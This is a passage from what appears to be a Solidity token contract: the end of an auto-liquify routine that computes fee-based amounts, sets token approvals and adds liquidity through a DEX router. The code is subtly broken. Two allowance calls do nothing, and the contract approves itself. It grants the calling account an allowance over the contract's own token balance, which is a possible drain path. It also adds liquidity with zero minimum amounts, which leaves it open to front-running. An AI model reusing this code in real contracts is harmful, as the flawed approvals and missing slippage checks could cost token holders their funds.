        uint256 LQTokenBalance = tokenContract.balanceOf(address(this));
        uint256 amountLiquidity = (LQTokenBalance * liquidityFee) / totalFee;
        uint256 amountToLiquify = (((_balances[address(this)] * _percentNativeToken) / 100) * liquidityFee) / totalFee;

        tokenContract.allowance(address(this), pancakeAddress);
        tokenContract.allowance(address(this), msg.sender);
        tokenContract.approve(msg.sender, amountLiquidity);
        tokenContract.approve(pancakeAddress, amountLiquidity);
        approve(address(this), amountToLiquify);

        router.addLiquidity(
            address(this),
            _tokenContract,
            amountToLiquify,
            amountLiquidity,
            0,
            0,
            autoLiquidityReceiver,
            block.timestamp
        );
        emit AutoLiquify(amountLiquidity, amountToLiquify);
    }
